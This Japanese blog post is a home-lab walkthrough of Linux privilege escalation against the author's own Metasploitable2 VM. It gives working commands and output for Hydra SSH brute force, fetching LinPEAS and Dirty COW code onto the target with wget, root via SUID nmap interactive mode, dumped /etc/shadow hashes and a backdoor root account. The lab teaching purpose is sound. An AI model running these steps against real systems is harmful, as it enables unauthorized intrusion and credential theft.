---
title: "【自宅ラボ検証】Linux権限昇格の基礎ハンズオン（Hydra / SUID nmap / Dirty COW）"
date: 2026-09-16
tags: ["vulnerability", "DirtyCOW", "Nmap", "権限昇格", "Security", "KaliLinux"]
source: "[[linux-privilege-escalation-basics-hydra-suid-dirtycow]]"
---
:::note warn
警告
本記事の内容は自宅ラボ内の隔離環境で、自分が所有・管理するMetasploitable2に対してのみ実施しています。
他人が管理するサーバやネットワークに対して同様の行為を行うことは不正アクセス禁止法などの法律に違反する可能性があります。本記事は学習・検証目的の共有であり、悪用を推奨するものではありません。
:::

## サイバーキルチェーンで見る本記事の位置づけ

今回の内容をサイバーキルチェーンの7段階に当てはめると、以下のように整理できます。

| 段階 | 内容 | 本記事での該当箇所 |
|---|---|---|
| ①偵察 | 標的の情報収集 | LinPEASによる権限昇格の糸口（設定ミス・脆弱性）の洗い出し |
| ④エクスプロイト | 脆弱性攻撃 | Hydraによるsshログイン情報の特定・侵入／SUID付きnmapの悪用／Dirty COW（CVE-2016-5195）によるカーネル脆弱性の悪用 |
| ⑦目的の実行 | データ窃取や被害 | root権限の獲得・管理者ユーザーの作成 |

![ハッキングの全体フロー図.jpeg](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/7802ec5a-b298-4b6b-898d-26ac927b4a6c.jpeg)

# 用語
## LinPEAS
LinPEAS（Linux Privilege Escalation Awesome Script）は、Linuxサーバーに侵入した後に「昇格に使えそうな設定ミスや脆弱性」を自動で洗い出してくれるスクリプトです。sudoの設定、SUIDバイナリ、cronジョブ、環境変数、インストール済みソフトのバージョンなど数百項目をチェックし、危険度に応じて色分け（赤・黄色が要注目）して表示してくれます。PEASS-ngというプロジェクトの一部で、Windows版は"WinPEAS"と呼ばれます。

## SUID
ファイルに設定される特殊なパーミッション。SUIDビットが付いた実行ファイルは、実行者ではなくファイル所有者の権限で動作する。

例：
```
-rwsr-xr-x 1 root root /usr/bin/nmap
```
- s がSUIDビット
- rootが所有しているため、誰が実行してもroot権限で動く
- 本来は passwd などの正当な目的で使われるが、不要なファイルに設定されていると権限昇格の穴になる

## Dirty COW
2016年に発見されたLinuxカーネルの脆弱性。**Copy-On-Write（COW）**機能の競合状態を悪用する。

仕組み：
- 通常、読み取り専用ファイルをメモリにマップして書き込もうとすると、カーネルがコピーを作成する
- タイミングの隙を突いて、本来書き込めないはずのファイル（/etc/passwd など）を改ざんできる

# ハンズオン
## Hydraを使ってパスワードクラック
Hydraを使ってパスワードクラックを試みます。Hydraはデフォルトで22ポートを使うので、攻撃対象が22ポートを開放しているかを確認します。
nmapのスキャン結果がopenとなっていればOKです。
```
# nmap 192.168.0.27 -sV -p 22
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 10:11 +0900
Nmap scan report for 192.168.0.27
Host is up (0.00024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
MAC Address: BC:24:11:5B:51:4E (Proxmox Server Solutions GmbH)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
```

Hydraを実行していきます。
その前にsshのconfigファイルを設定して古い暗号化方式を一時的に有効化していきます。
有効化しないと以下のようなエラーが出てきました。（攻撃対象のMetasploitable VMが少々古いため）
```
#  hydra -l user -P /usr/share/wordlists/fasttrack.txt ssh://192.168.0.27
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-16 10:20:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 262 login tries (l:1/p:262), ~17 tries per task
[DATA] attacking ssh://192.168.0.27:22/
[ERROR] could not connect to ssh://192.168.0.27:22 - kex error : no match for method mac algo client->server: server [hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96], client [hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512]
```

/etc/ssh/ssh_configの末尾に以下を追加します。
```
Host 192.168.0.27
    KexAlgorithms diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521
    HostKeyAlgorithms ssh-rsa,ssh-dss,ecdsa-sha2-nistp256,ssh-ed25519
    Ciphers aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc,aes128-ctr,aes192-ctr,aes256-ctr
    MACs hmac-md5,hmac-sha1,hmac-ripemd160,hmac-sha2-256,hmac-sha2-512
    SendEnv LANG LC_* COLORTERM NO_COLOR
    HashKnownHosts yes
```

この状態でHydraを再実行します。
処理が実行されて、パスワードを特定することが出来ました。
```
# hydra -l user -P /usr/share/wordlists/fasttrack.txt ssh://192.168.0.27
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-16 10:37:08
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 262 login tries (l:1/p:262), ~17 tries per task
[DATA] attacking ssh://192.168.0.27:22/
[22][ssh] host: 192.168.0.27   login: user   password: user
```

クラックしたパスワードでSSHを行います。
ログインが出来たことを確認します。
```
# touch ~/.ssh/config_temp
# ssh -F ~/.ssh/config_temp \
    -o "KexAlgorithms=diffie-hellman-group14-sha1" \
    -o "HostKeyAlgorithms=ssh-rsa" \
    -o "Ciphers=aes128-cbc" \
    -o "MACs=hmac-sha1" \
    -o "PubkeyAcceptedAlgorithms=+ssh-rsa" \
    user@192.168.0.27

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.27' (RSA) to the list of known hosts.
user@192.168.0.27's password: （Hydraでクラックしたパスワード入力）

user@metasploitable:~$ 
```

攻撃対象のuserでsudo（権限昇格）できないことを確認します。
```
user@metasploitable:~$ sudo -l
[sudo] password for user: 
Sorry, user user may not run sudo on metasploitable.
```

## LinPEASによる権限昇格の糸口特定
攻撃元であるKaliでLinPEASを用意し、PythonでHTTPサーバを立てて配布準備を行います。
```
# cd /tmp                
# wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
# python3 -m http.server 8000
```

攻撃対象側で以下を実行してLinPEASのスクリプトを持ち込み、実行するための権限を付与しておきます。
```
user@metasploitable:~$ cd /tmp                                                                                      
user@metasploitable:/tmp$ wget http://192.168.0.25:8000/linpeas.sh                                                  
--22:02:48--  http://192.168.0.25:8000/linpeas.sh                                                                   
           => `linpeas.sh'                                                                                          
Connecting to 192.168.0.25:8000... connected.                                                                       
HTTP request sent, awaiting response... 200 OK                                                                      
Length: 1,161,590 (1.1M) [application/x-sh]                                                                         
                                                                                                                    
100%[========================================================================>] 1,161,590     --.--K/s              
                                                                                                                    
22:02:48 (328.07 MB/s) - `linpeas.sh' saved [1161590/1161590]                                                       
                                                                                                                    
user@metasploitable:/tmp$ chmod +x /tmp/linpeas.sh                                                                  
user@metasploitable:/tmp$ ls -ltr                                                                                   
total 2324                                                                                                          
-rwxr-xr-x 1 user     user    1161590 2026-09-14 07:28 linpeas.sh                                                   
-rw------- 1 tomcat55 nogroup       0 2026-09-15 09:27 4733.jsvc_up                                                 
-rwxrwxrwx 1 root     root    1205508 2026-09-15 10:07 backdoor  
```

LinPEASのスクリプトを実行します。
攻撃対象の脆弱な部分を診断してくれます。
全量は記載しませんが、以下のような感じで事細かに出力されます。
```
user@metasploitable:/tmp$ ./linpeas.sh | tee linpeas_output.txt  

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                 
                               ╚═══════════════════╝                                                                
OS: Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
User & Groups: uid=1001(user) gid=1001(user) groups=1001(user)
Hostname: metasploitable

[+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                     
[+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                                                                          
[+] nmap is available for network discovery & port scanning, you should use it yourself                             
                                                                                                                    

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
                                                                                                                    
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                  
                              ╚════════════════════╝                                                                
╔══════════╣ Operative system (T1082)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#kernel-exploits
Linux version 2.6.24-16-server (buildd@palmer) (gcc version 4.2.3 (Ubuntu 4.2.3-2ubuntu7)) #1 SMP Thu Apr 10 13:58:00 UTC 2008
Distributor ID: Ubuntu
Description:    Ubuntu 8.04
Release:        8.04
Codename:       hardy

                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                  
                      ╚════════════════════════════════════╝                                                        
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-and-suid  
-rwsr-xr-x 1 root root 63K 2008-04-14 23:36 /bin/umount (Unknown SUID binary!)                                      
-rwsr-xr-- 1 root fuse 20K 2008-02-26 13:25 /bin/fusermount (Unknown SUID binary!)
-rwsr-xr-x 1 root root 25K 2008-04-02 21:08 /bin/su (Unknown SUID binary!)
-rwsr-xr-x 1 root root 80K 2008-04-14 23:36 /bin/mount (Unknown SUID binary!)
-rwsr-xr-x 1 root root 31K 2007-12-10 12:33 /bin/ping (Unknown SUID binary!)
-rwsr-xr-x 1 root root 27K 2007-12-10 12:33 /bin/ping6 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 64K 2008-12-02 14:31 /sbin/mount.nfs (Unknown SUID binary!)
-rwsr-xr-- 1 root dhcp 2.9K 2008-04-02 09:38 /lib/dhcp3-client/call-dhclient-script (Unknown SUID binary!)
-rwsr-xr-x 2 root root 106K 2008-02-25 06:22 /usr/bin/sudoedit (Unknown SUID binary!)
-rwsr-sr-x 1 root root 7.3K 2008-06-25 16:53 /usr/bin/X (Unknown SUID binary!)
-rwsr-xr-x 1 root root 8.4K 2007-11-22 07:14 /usr/bin/netkit-rsh (Unknown SUID binary!)
-rwsr-xr-x 1 root root 37K 2008-04-02 21:08 /usr/bin/gpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 13K 2007-12-10 12:33 /usr/bin/traceroute6.iputils (Unknown SUID binary!)
-rwsr-xr-x 2 root root 106K 2008-02-25 06:22 /usr/bin/sudo (Unknown SUID binary!)
-rwsr-xr-x 1 root root 12K 2007-11-22 07:14 /usr/bin/netkit-rlogin (Unknown SUID binary!)
-rwsr-xr-x 1 root root 11K 2007-12-10 12:33 /usr/bin/arping (Unknown SUID binary!)
-rwsr-sr-x 1 daemon daemon 38K 2007-02-20 08:41 /usr/bin/at (Unknown SUID binary!)
-rwsr-xr-x 1 root root 19K 2008-04-02 21:08 /usr/bin/newgrp (Unknown SUID binary!)
-rwsr-xr-x 1 root root 28K 2008-04-02 21:08 /usr/bin/chfn (Unknown SUID binary!)
-rwsr-xr-x 1 root root 763K 2008-04-08 10:04 /usr/bin/nmap (Unknown SUID binary!)
-rwsr-xr-x 1 root root 24K 2008-04-02 21:08 /usr/bin/chsh (Unknown SUID binary!)
-rwsr-xr-x 1 root root 16K 2007-11-22 07:14 /usr/bin/netkit-rcp (Unknown SUID binary!)
-rwsr-xr-x 1 root root 29K 2008-04-02 21:08 /usr/bin/passwd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 46K 2008-03-31 00:32 /usr/bin/mtr (Unknown SUID binary!)
-rwsr-sr-x 1 libuuid libuuid 13K 2008-03-27 13:25 /usr/sbin/uuidd (Unknown SUID binary!)
-rwsr-xr-- 1 root dip 263K 2007-10-04 15:57 /usr/sbin/pppd (Unknown SUID binary!)
-rwsr-xr-- 1 root telnetd 5.9K 2006-12-17 21:16 /usr/lib/telnetlogin (Unknown SUID binary!)
-rwsr-xr-- 1 root www-data 11K 2010-03-09 15:52 /usr/lib/apache2/suexec (Unknown SUID binary!)
-rwsr-xr-x 1 root root 4.5K 2007-11-05 15:48 /usr/lib/eject/dmcrypt-get-device (Unknown SUID binary!)
-rwsr-xr-x 1 root root 162K 2008-04-06 07:50 /usr/lib/openssh/ssh-keysign (Unknown SUID binary!)
-rwsr-xr-x 1 root root 9.4K 2009-08-17 21:04 /usr/lib/pt_chown (Unknown SUID binary!)

```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/9bfed1b8-e180-4a53-b6ad-30e871b846f0.png)

## 権限昇格をやってみる
今回は次の2種類で権限昇格を行ってみたいと思います。
①SUID悪用（nmap）
②Dirty COW（CVE-2016-5195）

### ①SUID悪用（nmap）
nmapは昔のバージョンだと対話形式で実行できたらしく、これを悪用してroot権限を取得する方法です。
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-and-suid  

省略

-rwsr-xr-x 1 root root 763K 2008-04-08 10:04 /usr/bin/nmap (Unknown SUID binary!)
```

実際に試してみた結果が以下となります。
実際にroot権限が取得でき、例えば/etc/shadow等のファイルを閲覧することが出来ました。
```
user@metasploitable:/tmp$ nmap --interactive 

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh

sh-3.2# whoami
root

sh-3.2# cat /etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
```

### Dirty COW（CVE-2016-5195）
Metasploitable2の古いLinuxカーネル（2.6系）に対して、Copy-on-Writeの脆弱性（CVE-2016-5195）を用いた昇格を実施します。

攻撃側でLinPEASを配布した時と同じように、dirtycowを配布します。
```
# git clone https://github.com/FireFart/dirtycow.git
# cd dirtycow 
# python3 -m http.server 8000
```

攻撃対象側で以下を実行して持ち込み、コンパイル・実行していきます。
```
user@metasploitable:/tmp$ pwd
/tmp
user@metasploitable:/tmp$ wget http://192.168.0.25:8000/dirty.c
--23:11:29--  http://192.168.0.25:8000/dirty.c
           => `dirty.c'
Connecting to 192.168.0.25:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4,795 (4.7K) [text/x-csrc]

100%[========================================================================>] 4,795         --.--K/s             

23:11:29 (871.19 MB/s) - `dirty.c' saved [4795/4795]

user@metasploitable:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
```

実行していきます。toorというユーザを管理者権限で新規作成する感じになるようです。
```
user@metasploitable:/tmp$ ./dirty password
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password
Complete line:
toor:tovO5Co1svV8M:0:0:pwned:/root:/bin/bash

mmap: b7f0f000

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'toor' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
user@metasploitable:/tmp$ 
user@metasploitable:/tmp$ madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'toor' and the password 'password'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

実際にtoorユーザにスイッチしてみます。
rootユーザがいたところがtoorユーザに変わっていますね。
```
user@metasploitable:/tmp$ su toor
Password: 
toor@metasploitable:/tmp# cat /etc/passwd
toor:tovO5Co1svV8M:0:0:pwned:/root:/bin/bash
```

確認が出来たら元に戻しておきましょう。
```
toor@metasploitable:/tmp# mv /tmp/passwd.bak /etc/passwd
toor@metasploitable:/tmp# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

